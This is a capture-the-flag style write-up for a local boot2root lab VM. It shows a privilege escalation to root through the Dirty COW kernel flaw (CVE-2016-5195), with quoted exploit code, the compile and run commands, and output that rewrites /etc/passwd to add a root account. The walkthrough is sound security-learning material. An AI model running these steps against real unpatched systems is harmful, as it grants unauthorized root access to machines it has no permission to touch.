# Dirty COW

```shell
$ ssh laurie@192.168.56.101
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
laurie@BornToSecHackMe:~$
```
Since we can login with a normal user `laurie` [after exploiting FTP](https://github.com/4slan/boot2root/blob/main/writeup1.md#ssh-laurie---diffusing-the-bomb), from this point we can execute a [Dirty COW attack](https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c). 

This vulnerability has CVE identifier [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-5195).

```shell
laurie@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
The vulnerability has existed in the Linux kernel since version 2.6.22 and has been patched in version 4.8.3.</br>
Our boot2root linux is surely affected.

```c
f = open(filename, O_RDONLY);
fstat(f, &st);
map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
```
The exploit script firstly create a private copy of a read-only file by calling `mmap`.

```c
pid = fork();
if (pid)
	/* ... */
else {
	pthread_create(&pth, NULL, madviseThread, NULL);
	ptrace(PTRACE_TRACEME);
	kill(getpid(), SIGSTOP);
	pthread_join(pth,NULL);
}
```
Next it calls `fork` to create a race condition. The new thread calls `madvise` function to tell the OS to dump the private copy during the procedure of writing data. This throwing away of the private copy results in the kernel accidentally writing to the original read-only file.


When we run the script, it writes a new root to `/etc/passwd` which we don't have writable permission.
```shell
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiDFcnMz5E5z6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '42'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '42'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Once execution done, we can log as `firefart:42`
```shell
laurie@BornToSecHackMe:~$ su firefart
Password: 42
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
```
